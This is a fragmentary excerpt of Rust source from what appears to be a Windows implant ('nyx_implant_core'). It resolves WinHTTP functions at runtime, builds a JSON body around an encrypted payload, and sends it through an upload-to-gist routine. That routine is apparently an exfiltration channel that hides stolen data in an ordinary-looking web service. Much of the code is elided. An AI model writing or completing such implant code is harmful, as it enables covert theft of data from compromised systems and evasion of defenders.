...
unsafe fn resolve_winhttp() -> Option<WinHttpFns> {
    let a = |name: &[u8]| -> Option<usize> {
        nyx_implant_core::resolve::export_addr(b"winhttp.dll", name)
    };
    Some(WinHttpFns {
...
fn to_utf16(s: &[u8]) -> nyx_implant_core::heap::Vec<u16> {
    let mut v = nyx_implant_core::heap::Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
...
fn upload_gist_build_body(encrypted_payload: &[u8]) -> nyx_implant_core::heap::Vec<u8> {
    ...
    let json_suffix = b"\"}}}";
    let mut body =
        nyx_implant_core::heap::Vec::with_capacity(json_prefix.len() + b64_len + json_suffix.len());
...
unsafe fn upload_gist_send(
    ...
    conn: *mut c_void,
    session: *mut c_void,
    body: &mut nyx_implant_core::heap::Vec<u8>,
) -> Result<(), &'static str> {
    // Send
    if (fns.send)(
        req,
